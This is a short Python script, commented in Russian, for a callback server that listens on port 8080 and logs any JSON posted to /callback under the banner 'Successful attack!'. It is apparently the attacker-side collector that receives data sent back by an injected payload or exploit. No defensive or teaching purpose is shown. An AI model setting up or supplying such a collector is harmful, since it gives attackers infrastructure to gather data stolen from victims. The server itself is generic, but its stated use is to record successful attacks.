from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class CallbackHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/callback':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                logging.info(f"\n=== Успешная атака! ===\n{json.dumps(data, indent=2)}\n======================")
                self.send_response(200)
                self.end_headers()
            except:
                self.send_response(400)

    def log_message(self, format, *args):
        return

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), CallbackHandler)
    logging.info("Callback-сервер запущен на порту 8080...")
    server.serve_forever()
